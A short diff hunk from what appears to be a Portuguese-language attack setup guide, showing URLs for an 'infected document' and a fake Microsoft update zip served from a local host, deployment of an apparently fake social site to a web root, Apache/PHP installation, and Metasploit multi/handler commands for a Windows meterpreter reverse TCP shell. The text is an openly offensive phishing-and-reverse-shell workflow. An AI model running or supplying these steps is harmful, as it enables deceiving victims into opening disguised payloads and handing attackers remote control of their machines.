@@ -20,6 +20,11 @@ http://192.168.1.137:8080/documento_infectado.rtf
 http://192.168.1.137:8080/microsoft_update.page.zip
 
 sudo cp -r /caminho/para/conectasocial_advanced /var/www/html/
+
+sudo apt update
+sudo apt install apache2 php libapache2-mod-php -y
+sudo systemctl restart apache2
+
 use exploit/multi/handler
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set LHOST 192.168.1.137
